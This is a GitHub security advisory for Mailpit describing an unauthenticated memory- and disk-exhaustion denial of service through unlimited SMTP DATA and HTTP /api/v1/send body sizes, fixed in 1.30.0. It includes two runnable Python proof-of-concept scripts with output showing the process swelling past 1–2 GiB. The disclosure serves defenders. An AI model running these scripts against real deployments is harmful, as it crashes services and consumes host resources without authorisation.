# [H] Mailpit: Unauthenticated remote memory-exhaustion DoS via unlimited SMTP DATA and /api/v1/send body sizes

## Summary
Severity: High
Advisory: GHSA-fpxj-m5q8-fphw
CVE: CVE-2026-45713
CWE: CWE-400, CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-fpxj-m5q8-fphw
Type: github-advisory

## Affected
- Go: `github.com/axllent/mailpit` — affected >=0 <1.30.0

## Details
### Summary
The Mailpit SMTP server has a Server.MaxSize int field that controls the maximum allowed DATA payload size, but the field is never assigned anywhere outside test code, leaving it at Go's zero value (0 ⇒ "no limit"). The same applies to the HTTP /api/v1/send endpoint, whose request body is decoded with json.NewDecoder(r.Body) and no http.MaxBytesReader. Because Mailpit's default listeners bind [::]:1025 (SMTP) and [::]:8025 (HTTP), with no authentication required on either, a single network-reachable attacker can push an arbitrarily large message into Mailpit and watch RAM consumption spike with a ~7-10× amplification factor (raw frame → enmime envelope tree → search-text index → zstd-encoded write to SQLite). Repeating the attack — or running it concurrently from multiple connections — drives the process to OOM-kill.

### Details
Pre-auth, remote DoS on every Mailpit deployment running the default configuration. Memory is the primary axis; disk is a secondary one, because each oversized message is also persisted to the SQLite store (config.MaxMessages caps the count at 500 but never the bytes — so 500 attacker-sized messages × 1 GiB each = ~500 GiB on the host disk before the LRU rotates).


Affected code
[internal/smtpd/smtpd.go:107](https://github.com/axllent/mailpit/blob/develop/internal/smtpd/smtpd.go#L107) — the field exists:

```
type Server struct {
    ...
    MaxSize int // Maximum message size allowed, in bytes
    ...
}
```
[internal/smtpd/smtpd.go:863-877](https://github.com/axllent/mailpit/blob/develop/internal/smtpd/smtpd.go#L863-L877) — the enforcement is gated on > 0:

```
for {
    ...
    line, err := s.br.ReadBytes('\n')
    if err != nil {
        return nil, err
    }
    if bytes.Equal(line, []byte(".\r\n")) {
        break
    }
    if line[0] == '.' {
        line = line[1:]
    }

    if s.srv.MaxSize > 0 {                                   // ← only when set
        if len(data)+len(line) > s.srv.MaxSize {
            _, _ = s.br.Discard(s.br.Buffered())
            return nil, maxSizeExceeded(s.srv.MaxSize)
        }
    }
    data = append(data, line...)                             // ← otherwise grows unbounded
}
```
[internal/smtpd/main.go:223-248](https://github.com/axllent/mailpit/blob/develop/internal/smtpd/main.go#L223-L248) — the field is never populated; grep -rn "MaxSize" cmd/ config/ returns zero hits. There is no --smtp-max-message-size CLI flag, no MP_SMTP_MAX_MESSAGE_SIZE env var.

[server/apiv1/send.go:45-52](https://github.com/axllent/mailpit/blob/develop/server/apiv1/send.go#L45-L52) — HTTP path has the same defect:

```
decoder := json.NewDecoder(r.Body)
data := sendMessageParams{}
if err := decoder.Decode(&data.Body); err != nil {
    httpJSONError(w, err.Error())
    return
}
```

No r.Body = http.MaxBytesReader(w, r.Body, N) wrapper; server.ReadTimeout of 30 s is transmission-time, not body-size-budget.

### PoC
Baseline RSS on a freshly-started binary: 25 MiB. After one 100 MiB SMTP DATA block: ~1 037 MiB (≈10× amplification, single connection, no auth):

```
#!/usr/bin/env python3
# poc-smtp-dos.py
import socket, sys
host, port = sys.argv[1], int(sys.argv[2])
mb         = int(sys.argv[3])  # message size, MiB

s = socket.create_connection((host, port), timeout=120)
def r(): return s.recv(4096).decode("latin-1", "replace").strip()
print(r())
for cmd in [b"HELO x\r\n",
            b"MAIL FROM:<a@b.com>\r\n",
            b"RCPT TO:<c@d.com>\r\n",
            b"DATA\r\n"]:
    s.sendall(cmd); print(r())
s.sendall(b"Subject: oversize\r\n\r\n")
chunk = b"X" * (1024 * 1024)
for _ in range(mb): s.sendall(chunk)
s.sendall(b"\r\n.\r\n")
print(r()); s.close()
```

```
$ python3 poc-smtp-dos.py 127.0.0.1 1025 100
220 hostname Mailpit ESMTP Service ready
250 hostname greets x
250 2.1.0 Ok
250 2.1.5 Ok
354 Start mail input; end with <CR><LF>.<CR><LF>
250 2.0.0 Ok: queued as 58rI69JTJYjVFwogEbw9Jj

$ ps -o rss= -p $(pgrep -f /usr/local/bin/mailpit)
1062848    # ≈ 1 037 MiB, up from 25 MiB baseline
```

Equivalent over HTTP:

```
# poc-http-dos.py
import socket, sys
host, port, mb = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
prefix = b'{"From":{"Email":"a@b.com"},"To":[{"Email":"c@d.com"}],"Subject":"big","Text":"'
suffix = b'"}'
N      = mb * 1024 * 1024
clen   = len(prefix) + N + len(suffix)

s = socket.create_connection((host, port), timeout=120)
s.sendall(
    b"POST /api/v1/send HTTP/1.1\r\n"
    b"Host: x\r\n"
    b"Content-Type: application/json\r\n"
    b"Content-Length: " + str(clen).encode() + b"\r\n"
    b"Connection: close\r\n\r\n")
s.sendall(prefix)
chunk = b"X" * (1024 * 1024)
for _ in range(mb): s.sendall(chunk)
s.sendall(suffix)
print(s.recv(500).decode("latin-1", "replace"))
```

```
$ python3 poc-http-dos.py 127.0.0.1 8025 200
HTTP/1.1 200 OK
...
$ ps -o rss= -p $(pgrep -f /usr/local/bin/mailpit)
2147000      # comfortably above 2 GiB on the same process

```

Five concurrent SMTP connections × 50 MiB each took the same machine from 25 MiB → 1 970 MiB during the attack window. With sufficient bandwidth the only ceiling is host RAM.

### Impact
Unauthenticated remote attackers can send arbitrarily large emails via SMTP or HTTP, causing unbounded memory and disk growth, leading to out-of-memory (OOM) kills and full Mailpit process crash (DoS)

## References
- https://github.com/axllent/mailpit/security/advisories/GHSA-fpxj-m5q8-fphw
- https://github.com/axllent/mailpit
- https://github.com/axllent/mailpit/releases/tag/v1.30.0
